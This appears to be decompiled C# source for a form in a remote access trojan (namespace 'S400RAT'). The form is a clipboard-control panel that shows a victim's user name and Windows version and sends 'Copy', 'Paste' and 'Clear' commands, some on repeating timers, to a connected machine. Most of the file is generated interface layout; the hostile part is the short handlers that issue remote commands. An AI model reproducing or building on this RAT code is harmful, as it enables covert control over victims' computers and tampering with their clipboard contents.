using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using SQLABC_ModernUI;

namespace S400RAT;

[DesignerGenerated]
public class Cli : Form
{
	public IContainer icontainer_0;

	[AccessedThroughProperty("Guna2AnimateWindow1")]
	[CompilerGenerated]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2BorderlessForm1")]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2ControlBox1")]
	public Guna2ControlBox guna2ControlBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("panel5")]
	public Panel panel_0;

	[AccessedThroughProperty("n")]
	[CompilerGenerated]
	public Label label_0;

	[CompilerGenerated]
	[AccessedThroughProperty("w")]
	public Label label_1;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox1")]
	public PictureBox pictureBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Label2")]
	public Label label_2;

	[AccessedThroughProperty("Label7")]
	[CompilerGenerated]
	public Label label_3;

	[AccessedThroughProperty("Label1")]
	[CompilerGenerated]
	public Label label_4;

	[CompilerGenerated]
	[AccessedThroughProperty("pictureBox3")]
	public PictureBox pictureBox_1;

	[CompilerGenerated]
	[AccessedThroughProperty("label9")]
	public Label label_5;

	[CompilerGenerated]
	[AccessedThroughProperty("CCC")]
	public Panel panel_1;

	[CompilerGenerated]
	[AccessedThroughProperty("TextBox1")]
	public TextBox textBox_0;

	[AccessedThroughProperty("Button8")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_0;

	[AccessedThroughProperty("Button9")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_1;

	[AccessedThroughProperty("Guna2GradientButton1")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_2;

	[AccessedThroughProperty("Guna2GradientButton2")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer1")]
	public Timer timer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer2")]
	public Timer timer_1;

	[CompilerGenerated]
	[AccessedThroughProperty("SqlabC_ControlMini1")]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	[AccessedThroughProperty("Clos")]
	[CompilerGenerated]
	public Timer timer_2;

	public Client sk;

	public Client C;

	public string ss;

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_7;
			Guna2ControlBox guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click -= value2;
			}
			guna2ControlBox_0 = value;
			guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click += value2;
			}
		}
	}

	public virtual Panel panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	internal virtual Label n
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Label w
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	public virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual PictureBox pictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	public virtual Label label9
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	public virtual Panel CCC
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[CompilerGenerated]
		get
		{
			return textBox_0;
		}
		[CompilerGenerated]
		set
		{
			textBox_0 = value;
		}
	}

	internal virtual Guna2GradientButton Button8
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_2;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientButton Button9
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_1;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_1 = value;
			guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientButton Guna2GradientButton1
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_2;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_6;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_2;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_2 = value;
			guna2GradientButton = guna2GradientButton_2;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientButton Guna2GradientButton2
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_3;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_5;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_3;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_3 = value;
			guna2GradientButton = guna2GradientButton_3;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	public Cli()
	{
		base.Load += Cli_Load;
		method_0();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Cli));
		vmethod_1(new Guna2AnimateWindow(icontainer_0));
		vmethod_3(new Guna2BorderlessForm(icontainer_0));
		Guna2ControlBox1 = new Guna2ControlBox();
		panel5 = new Panel();
		n = new Label();
		w = new Label();
		PictureBox1 = new PictureBox();
		Label2 = new Label();
		Label7 = new Label();
		Label1 = new Label();
		pictureBox3 = new PictureBox();
		label9 = new Label();
		CCC = new Panel();
		Guna2GradientButton1 = new Guna2GradientButton();
		Guna2GradientButton2 = new Guna2GradientButton();
		Button8 = new Guna2GradientButton();
		Button9 = new Guna2GradientButton();
		TextBox1 = new TextBox();
		vmethod_5(new Timer(icontainer_0));
		vmethod_7(new Timer(icontainer_0));
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		vmethod_9(new Timer(icontainer_0));
		panel5.SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		CCC.SuspendLayout();
		SuspendLayout();
		vmethod_0().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_0().TargetForm = this;
		vmethod_2().ContainerControl = this;
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BackColor = Color.Transparent;
		Guna2ControlBox1.BorderColor = Color.Transparent;
		Guna2ControlBox1.FillColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(512, 2);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 120;
		panel5.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		panel5.BackColor = Color.FromArgb(37, 42, 64);
		panel5.Controls.Add(n);
		panel5.Controls.Add(w);
		panel5.Controls.Add(PictureBox1);
		panel5.Controls.Add(Label2);
		panel5.Controls.Add(Label7);
		panel5.Controls.Add(Label1);
		panel5.Controls.Add(pictureBox3);
		panel5.Controls.Add(label9);
		panel5.Location = new Point(0, 0);
		panel5.Name = "panel5";
		panel5.Size = new Size(329, 125);
		panel5.TabIndex = 124;
		n.AutoSize = true;
		n.Font = new Font("Nirmala UI", 9.75f);
		n.ForeColor = Color.FromArgb(158, 161, 176);
		n.Location = new Point(94, 81);
		n.Name = "n";
		n.Size = new Size(18, 17);
		n.TabIndex = 109;
		n.Text = "--";
		w.AutoSize = true;
		w.Font = new Font("Nirmala UI", 9.75f);
		w.ForeColor = Color.FromArgb(158, 161, 176);
		w.Location = new Point(94, 102);
		w.Name = "w";
		w.Size = new Size(18, 17);
		w.TabIndex = 108;
		w.Text = "--";
		PictureBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox1.Image = (Image)componentResourceManager.GetObject("PictureBox1.Image");
		PictureBox1.Location = new Point(268, 7);
		PictureBox1.Name = "PictureBox1";
		PictureBox1.Size = new Size(53, 38);
		PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox1.TabIndex = 107;
		PictureBox1.TabStop = false;
		Label2.AutoSize = true;
		Label2.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label2.ForeColor = Color.White;
		Label2.Location = new Point(4, 7);
		Label2.Name = "Label2";
		Label2.Size = new Size(141, 25);
		Label2.TabIndex = 106;
		Label2.Text = "Copy and Paste";
		Label7.AutoSize = true;
		Label7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.FromArgb(158, 161, 176);
		Label7.Location = new Point(19, 100);
		Label7.Name = "Label7";
		Label7.Size = new Size(68, 17);
		Label7.TabIndex = 4;
		Label7.Text = "Windows :";
		Label1.AutoSize = true;
		Label1.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label1.ForeColor = Color.FromArgb(158, 161, 176);
		Label1.Location = new Point(6, 79);
		Label1.Name = "Label1";
		Label1.Size = new Size(81, 17);
		Label1.TabIndex = 3;
		Label1.Text = "User Name :";
		pictureBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		pictureBox3.Image = (Image)componentResourceManager.GetObject("pictureBox3.Image");
		pictureBox3.Location = new Point(268, 59);
		pictureBox3.Name = "pictureBox3";
		pictureBox3.Size = new Size(53, 58);
		pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox3.TabIndex = 2;
		pictureBox3.TabStop = false;
		label9.AutoSize = true;
		label9.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label9.ForeColor = Color.FromArgb(84, 131, 255);
		label9.Location = new Point(4, 44);
		label9.Name = "label9";
		label9.Size = new Size(111, 25);
		label9.TabIndex = 0;
		label9.Text = "Information";
		CCC.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		CCC.BackColor = Color.FromArgb(37, 42, 64);
		CCC.Controls.Add(Guna2GradientButton1);
		CCC.Controls.Add(Guna2GradientButton2);
		CCC.Controls.Add(Button8);
		CCC.Controls.Add(Button9);
		CCC.Controls.Add(TextBox1);
		CCC.ForeColor = Color.Transparent;
		CCC.Location = new Point(12, 131);
		CCC.Name = "CCC";
		CCC.Size = new Size(535, 313);
		CCC.TabIndex = 123;
		Guna2GradientButton1.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Guna2GradientButton1.Animated = true;
		Guna2GradientButton1.AutoRoundedCorners = true;
		Guna2GradientButton1.BackColor = Color.Transparent;
		Guna2GradientButton1.BorderRadius = 22;
		Guna2GradientButton1.CheckedState.Parent = Guna2GradientButton1;
		Guna2GradientButton1.CustomImages.Parent = Guna2GradientButton1;
		Guna2GradientButton1.FillColor = Color.FromArgb(24, 30, 54);
		Guna2GradientButton1.FillColor2 = Color.FromArgb(24, 30, 54);
		Guna2GradientButton1.Font = new Font("Segoe UI", 9f);
		Guna2GradientButton1.ForeColor = Color.White;
		Guna2GradientButton1.HoverState.Parent = Guna2GradientButton1;
		Guna2GradientButton1.ImageAlign = HorizontalAlignment.Right;
		Guna2GradientButton1.IndicateFocus = true;
		Guna2GradientButton1.Location = new Point(271, 260);
		Guna2GradientButton1.Name = "Guna2GradientButton1";
		Guna2GradientButton1.ShadowDecoration.Parent = Guna2GradientButton1;
		Guna2GradientButton1.Size = new Size(252, 46);
		Guna2GradientButton1.TabIndex = 134;
		Guna2GradientButton1.Text = "Start Copy";
		Guna2GradientButton1.UseTransparentBackground = true;
		Guna2GradientButton2.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Guna2GradientButton2.Animated = true;
		Guna2GradientButton2.AutoRoundedCorners = true;
		Guna2GradientButton2.BackColor = Color.Transparent;
		Guna2GradientButton2.BorderRadius = 22;
		Guna2GradientButton2.CheckedState.Parent = Guna2GradientButton2;
		Guna2GradientButton2.CustomImages.Parent = Guna2GradientButton2;
		Guna2GradientButton2.FillColor = Color.FromArgb(24, 30, 54);
		Guna2GradientButton2.FillColor2 = Color.FromArgb(24, 30, 54);
		Guna2GradientButton2.Font = new Font("Segoe UI", 9f);
		Guna2GradientButton2.ForeColor = Color.White;
		Guna2GradientButton2.HoverState.Parent = Guna2GradientButton2;
		Guna2GradientButton2.ImageAlign = HorizontalAlignment.Right;
		Guna2GradientButton2.IndicateFocus = true;
		Guna2GradientButton2.Location = new Point(10, 260);
		Guna2GradientButton2.Name = "Guna2GradientButton2";
		Guna2GradientButton2.ShadowDecoration.Parent = Guna2GradientButton2;
		Guna2GradientButton2.Size = new Size(255, 46);
		Guna2GradientButton2.TabIndex = 133;
		Guna2GradientButton2.Text = "Start Clear Copy";
		Guna2GradientButton2.UseTransparentBackground = true;
		Button8.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Button8.Animated = true;
		Button8.AutoRoundedCorners = true;
		Button8.BackColor = Color.Transparent;
		Button8.BackgroundImageLayout = ImageLayout.Zoom;
		Button8.BorderColor = Color.FromArgb(24, 30, 54);
		Button8.BorderRadius = 22;
		Button8.CheckedState.Parent = Button8;
		Button8.CustomImages.Parent = Button8;
		Button8.FillColor = Color.FromArgb(24, 30, 54);
		Button8.FillColor2 = Color.FromArgb(24, 30, 54);
		Button8.Font = new Font("Segoe UI", 9f);
		Button8.ForeColor = Color.White;
		Button8.HoverState.Parent = Button8;
		Button8.ImageAlign = HorizontalAlignment.Left;
		Button8.IndicateFocus = true;
		Button8.Location = new Point(10, 205);
		Button8.Name = "Button8";
		Button8.ShadowDecoration.Parent = Button8;
		Button8.Size = new Size(255, 46);
		Button8.TabIndex = 125;
		Button8.Text = "Copy";
		Button8.UseTransparentBackground = true;
		Button9.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Button9.Animated = true;
		Button9.AutoRoundedCorners = true;
		Button9.BackColor = Color.Transparent;
		Button9.BorderRadius = 22;
		Button9.CheckedState.Parent = Button9;
		Button9.CustomImages.Parent = Button9;
		Button9.FillColor = Color.FromArgb(24, 30, 54);
		Button9.FillColor2 = Color.FromArgb(24, 30, 54);
		Button9.Font = new Font("Segoe UI", 9f);
		Button9.ForeColor = Color.White;
		Button9.HoverState.Parent = Button9;
		Button9.ImageAlign = HorizontalAlignment.Right;
		Button9.IndicateFocus = true;
		Button9.Location = new Point(271, 205);
		Button9.Name = "Button9";
		Button9.ShadowDecoration.Parent = Button9;
		Button9.Size = new Size(252, 46);
		Button9.TabIndex = 126;
		Button9.Text = "Paste";
		Button9.UseTransparentBackground = true;
		TextBox1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		TextBox1.BackColor = Color.FromArgb(46, 51, 73);
		TextBox1.BorderStyle = BorderStyle.None;
		TextBox1.Font = new Font("Nirmala UI", 9.75f);
		TextBox1.ForeColor = Color.White;
		TextBox1.Location = new Point(12, 15);
		TextBox1.Multiline = true;
		TextBox1.Name = "TextBox1";
		TextBox1.Size = new Size(511, 172);
		TextBox1.TabIndex = 118;
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(46, 51, 73);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
		SqlabC_ControlMini1.Location = new Point(488, 7);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 133;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		vmethod_8().Enabled = true;
		vmethod_8().Interval = 10;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(46, 51, 73);
		base.ClientSize = new Size(559, 456);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(panel5);
		base.Controls.Add(CCC);
		base.Controls.Add(Guna2ControlBox1);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "Cli";
		Text = "Cli";
		panel5.ResumeLayout(performLayout: false);
		panel5.PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		CCC.ResumeLayout(performLayout: false);
		CCC.PerformLayout();
		ResumeLayout(performLayout: false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_0()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_2()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_4()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Timer WithEventsValue)
	{
		EventHandler value = method_3;
		Timer timer = timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_0 = WithEventsValue;
		timer = timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_6()
	{
		return timer_1;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_7(Timer WithEventsValue)
	{
		EventHandler value = method_4;
		Timer timer = timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_1 = WithEventsValue;
		timer = timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_8()
	{
		return timer_2;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_9(Timer WithEventsValue)
	{
		EventHandler value = method_9;
		Timer timer = timer_2;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_2 = WithEventsValue;
		timer = timer_2;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	public void method_1(object sender, EventArgs e)
	{
		C.Send("Past");
	}

	public void Cli_Load(object sender, EventArgs e)
	{
		C.Send("Admin" + Class7.string_1);
	}

	public void method_2(object sender, EventArgs e)
	{
		C.Send("Copy" + Class7.string_1 + TextBox1.Text);
	}

	public void method_3(object sender, EventArgs e)
	{
		C.Send("Clear");
	}

	public void method_4(object sender, EventArgs e)
	{
		C.Send("Copy" + Class7.string_1 + TextBox1.Text);
	}

	public void method_5(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton2.Text, "Start Clear Copy", TextCompare: false) == 0)
		{
			vmethod_4().Start();
			Guna2GradientButton2.Text = "Stop Clear Copy";
		}
		else
		{
			vmethod_4().Stop();
			Guna2GradientButton2.Text = "Start Clear Copy";
		}
	}

	public void method_6(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "Start Copy", TextCompare: false) == 0)
		{
			vmethod_6().Start();
			Guna2GradientButton1.Text = "Stop Copy";
		}
		else
		{
			vmethod_6().Stop();
			Guna2GradientButton1.Text = "Start Copy";
		}
	}

	public void method_7(object sender, EventArgs e)
	{
		if (C != null)
		{
			C.CN = false;
		}
	}

	public void method_8(object sender, EventArgs e)
	{
		Hide();
	}

	public void method_9(object sender, EventArgs e)
	{
		if (!C.CN)
		{
			C.CN = false;
			Close();
		}
	}
}
